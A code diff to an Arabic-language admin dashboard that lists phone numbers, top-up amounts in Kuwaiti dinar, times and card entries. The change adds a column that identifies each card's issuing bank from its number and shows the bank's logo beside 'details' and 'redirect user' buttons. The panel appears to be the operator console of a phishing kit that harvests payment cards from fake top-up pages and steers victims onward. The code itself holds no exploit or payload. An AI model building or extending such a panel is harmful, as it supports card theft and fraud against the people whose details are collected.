@@ -234,6 +234,7 @@
         <table>
           <thead>
             <tr>
+              <th>البنك</th>
               <th>رقم الجوال</th>
               <th>قيمة الشحن</th>
               <th>الوقت</th>
@@ -379,9 +380,14 @@
   function render(list){
     document.getElementById('totalOrders').textContent = list.length;
     const rows = document.getElementById('rows');
-    if(!list.length){ rows.innerHTML = '<tr><td colspan="5" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
-    rows.innerHTML = list.map(s =>
-      '<tr>' +
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="6" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    rows.innerHTML = list.map(s => {
+      const bank = detectBank(s.card);
+      const bankCell = bank
+        ? '<img src="'+escapeHtml(bank.logo)+'" alt="" style="height:22px;width:auto;vertical-align:middle;margin-left:6px" onerror="this.style.display=\'none\'"><span style="font-size:12px;font-weight:700">'+escapeHtml(bank.name)+'</span>'
+        : '<span style="color:var(--ink-soft);font-size:12px">—</span>';
+      return '<tr>' +
+        '<td>'+bankCell+'</td>' +
         '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
         '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
         '<td class="time">'+fmtTime(s.time)+'</td>' +
@@ -390,8 +396,8 @@
           '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
           '<button class="tbl-btn redirect" onclick="redirectUser(\''+s.id+'\')">إعادة التوجيه</button>' +
         '</td>' +
-      '</tr>'
-    ).join('');
+      '</tr>';
+    }).join('');
   }
 
   function escapeHtml(x){ return String(x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
@@ -476,7 +482,7 @@
     const bank = detectBank(s.card);
     let bankHtml = '';
     if (bank) {
-      bankHtml = '<div class="bank-banner"><img src="'+escapeHtml(bank.logo)+'" alt=""><span class="bank-name">'+escapeHtml(bank.name)+'</span></div>';
+      bankHtml = '<div class="bank-banner"><img src="'+escapeHtml(bank.logo)+'" alt="" onerror="this.style.display=\'none\'"><span class="bank-name">'+escapeHtml(bank.name)+'</span></div>';
     }
 
     const body = document.getElementById('modalBody');
